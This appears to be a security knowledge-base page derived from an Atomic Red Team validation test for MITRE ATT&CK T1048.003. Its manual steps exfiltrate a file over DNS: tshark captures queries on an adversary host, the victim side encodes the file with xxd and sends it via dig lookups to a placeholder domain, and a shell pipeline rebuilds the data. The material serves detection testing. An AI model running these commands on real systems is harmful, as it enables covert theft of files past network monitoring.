---
atomic_guid: "c403b5a4-b5fc-49f2-b181-d1c80d27db45"
title: "Exfiltration Over Alternative Protocol - DNS"
framework: "atomic"
generated: "true"
attack_technique_id: "T1048.003"
attack_technique_name: "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.yaml"
build_date: "2026-04-26 17:02:12"
executor: "manual"
aliases:
  - "c403b5a4-b5fc-49f2-b181-d1c80d27db45"
  - "Exfiltration Over Alternative Protocol - DNS"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Exfiltration Over Alternative Protocol - DNS

Exfiltration of specified file over DNS protocol.

## Metadata

- Atomic GUID: c403b5a4-b5fc-49f2-b181-d1c80d27db45
- Technique: T1048.003: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
- Platforms: linux
- Executor: manual
- Source Path: atomics/T1048.003/T1048.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1048-exfiltration_over_alternative_protocol|T1048.003]]

## Executor

- name: manual
- steps: 1. On the adversary machine run the below command.

    tshark -f "udp port 53" -Y "dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches \\".domain\\"" >> received_data.txt

2. On the victim machine run the below commands.

    xxd -p input_file > encoded_data.hex | for data in `cat encoded_data.hex`; do dig $data.domain; done

3. Once the data is received, use the below command to recover the data.

    cat output_file | cut -d "A" -f 2 | cut -d " " -f 2 | cut -d "." -f 1 | sort | uniq | xxd -p -r


## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.yaml)
